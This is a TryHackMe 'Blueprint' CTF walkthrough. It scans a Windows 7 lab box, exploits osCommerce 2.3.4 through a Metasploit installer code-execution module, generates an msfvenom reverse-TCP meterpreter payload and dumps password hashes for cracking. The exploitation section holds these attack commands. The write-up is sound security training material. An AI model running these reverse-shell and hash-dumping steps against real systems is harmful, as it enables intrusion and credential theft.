# Blueprint

[Link to room](https://tryhackme.com/room/blueprint)

###### Enumeration

echo machine-ip blueprint.com >> /etc/hosts

```nmap
# Nmap 7.80 scan initiated Thu Jun 18 03:21:05 2020 as: nmap -sC -sV -oN nmap.txt blueprint.com
Nmap scan report for blueprint.com (10.10.135.2)
Host is up (0.48s latency).
Not shown: 987 closed ports
PORT      STATE SERVICE      VERSION
80/tcp    open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/7.5
|_http-title: 404 - File or directory not found.
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
443/tcp   open  ssl/http     Apache httpd 2.4.23 ((Win32) OpenSSL/1.0.2h PHP/5.6.28)
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Apache/2.4.23 (Win32) OpenSSL/1.0.2h PHP/5.6.28
|_http-title: Bad request!
| ssl-cert: Subject: commonName=localhost
| Not valid before: 2009-11-10T23:48:47
|_Not valid after:  2019-11-08T23:48:47
|_ssl-date: TLS randomness does not represent time
| tls-alpn: 
|_  http/1.1
445/tcp   open  microsoft-ds Windows 7 Home Basic 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)
3306/tcp  open  mysql        MariaDB (unauthorized)
8080/tcp  open  http         Apache httpd 2.4.23 (OpenSSL/1.0.2h PHP/5.6.28)
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Apache/2.4.23 (Win32) OpenSSL/1.0.2h PHP/5.6.28
|_http-title: Index of /
49152/tcp open  msrpc        Microsoft Windows RPC
49153/tcp open  msrpc        Microsoft Windows RPC
49154/tcp open  msrpc        Microsoft Windows RPC
49158/tcp open  msrpc        Microsoft Windows RPC
49159/tcp open  msrpc        Microsoft Windows RPC
49160/tcp open  msrpc        Microsoft Windows RPC
Service Info: Hosts: BLUEPRINT, localhost; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: -19m57s, deviation: 34m36s, median: 0s
|_nbstat: NetBIOS name: BLUEPRINT, NetBIOS user: <unknown>, NetBIOS MAC: 02:2c:8d:2f:12:fa (unknown)
| smb-os-discovery: 
|   OS: Windows 7 Home Basic 7601 Service Pack 1 (Windows 7 Home Basic 6.1)
|   OS CPE: cpe:/o:microsoft:windows_7::sp1
|   Computer name: BLUEPRINT
|   NetBIOS computer name: BLUEPRINT\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2020-06-18T08:23:19+01:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2020-06-18T07:23:16
|_  start_date: 2020-06-18T07:17:16

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Thu Jun 18 03:23:34 2020 -- 1 IP address (1 host up) scanned in 149.46 seconds
```

> I tried running `enum4linux` but could not get anything, `eternal blue` also does not work

> webserver on port 80 have nothing

> moving onto webserver on port 8080 

we see a website lets try use gobuster for directory brute-forcing

```bash
gobuster dir -u http://blueprint.com:8080/oscommerce-2.3.4/catalog/  -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

```
===============================================================
2020/06/18 03:47:51 Starting gobuster
===============================================================
/download (Status: 401)
/images (Status: 301)
/pub (Status: 301)
/Images (Status: 301)
/admin (Status: 301)
/includes (Status: 301)
/install (Status: 301)
/Download (Status: 401)
/ext (Status: 301)
/INSTALL (Status: 301)
/IMAGES (Status: 301)
/%20 (Status: 403)
/Admin (Status: 301)
/*checkout* (Status: 403)
```

checking the install page we see something fishy also we will get the `version of oscommerce`
now lets dig deep into this webserver and search for an exploit
```start metasploit and search oscommerce```

###### Exploitation
```
Exploit we use:
exploit/multi/http/oscommerce_installer_unauth_code_exec
set options
and run
we will get a meterpreter session 
but this session is not stable
```
So we will create a payload and upload it using the meterpreter session

```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f exe > shell.exe
```

```
open another tab and run metasploit
use handler and and run it
on the previous meterpreter session
run: 
execute -f shell.exe
and we will get a new meterpreter session that is stable
run:
hashdump
to look for hashes and crack them online using htts://crackstation.net
```

1. Lab user hash

> Lab:1000:aad3b435b51404eeaad3b435b51404ee:??????????????????????:::

> go????????

2. root flag

`navigate to C:\Users\Administrator\Desktop` cat the root flag

> THM{????????????????????9bee}
